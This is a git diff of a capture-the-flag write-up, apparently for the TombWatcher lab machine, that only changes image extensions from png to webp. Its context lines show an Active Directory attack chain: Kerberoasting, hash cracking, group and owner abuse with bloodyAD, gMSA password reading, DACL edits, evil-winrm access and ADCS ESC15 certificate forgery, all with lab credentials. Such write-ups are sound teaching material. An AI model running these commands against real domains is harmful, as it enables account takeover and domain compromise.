@@ -76,7 +76,7 @@ bloodhound-python -dc DC01.tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' -d tomb
 
 The **First Degree Object Control** for the user `henry` has a `WriteSPN` privilege to the user `Alfred` . Get the *UserSPN* of Alfred, then crack the krb5tgs with hashcat and rockyou
 
-![image.png](image.png)
+![image.png](image.webp)
 
 ```bash
 GetUserSPNs.py tombwatcher.htb/henry:'H3nry_987TGV!' -dc-ip 10.10.11.72 -request
@@ -91,7 +91,7 @@ hashcat -m 13100 alfred-hash rockyou.txt
 
 Now that you have the password of `Alfred` look in the bloodhound again. As we can see that the user Alfred can add himself on the group of `Infrastructure@tombwatcher.htb` use BloodyAD to add the user Alfred to the group.
 
-![image.png](image%201.png)
+![image.png](image%201.webp)
 
 ```bash
 # Add Alfred to Infrastructure
@@ -106,7 +106,7 @@ memberOf: CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb
 
 Now looking back again at bloodhound. We’ll notice that `Infrastructure` has **ReadGMSAPassword** privilege to `ANSIBLE_DEV$` Read the password of the user *ANSIBLE* using *Alfred*.
 
-![image.png](image%202.png)
+![image.png](image%202.webp)
 
 ```bash
 bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u alfred -p basketball get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
@@ -124,7 +124,7 @@ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u ansible_dev$ -p :1c37d00093dc2
 
  That’s it we now have the user `sam`. Now looking back again at Bloodhound, we’ll find that *sam* has `WriteOwner` privilege to the user `John`. So we’ll change the ownership.
 
-![image.png](image%203.png)
+![image.png](image%203.webp)
 
 ```bash
 bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p 'Password123!' set owner john sam                                           
@@ -152,7 +152,7 @@ evil-winrm -i dc01.tombwatcher.htb -u John -p 'Password123!'
 
 Upon looking at Bloodhound, we’ll notice that the user *John* has a GenericAll privilege directly to `ADCS`. However, *ADCS* is an Organizational Unit so we need to abuse this privilege and modify the DACL for John on ADCS.
 
-![image.png](image%204.png)
+![image.png](image%204.webp)
 
 ```bash
 impacket-dacledit -action write -rights FullControl -inheritance -principal
@@ -228,7 +228,7 @@ vulnerable -stdout
 
 We will find out that the vulnerable template is ESC15, it’s a WebServer template vulnerability.
 
-![image.png](image%205.png)
+![image.png](image%205.webp)
 
 We’ll get the `administrator.pfx` with the following by requesting a certificate and forge it to impersonate **administrator**.
 
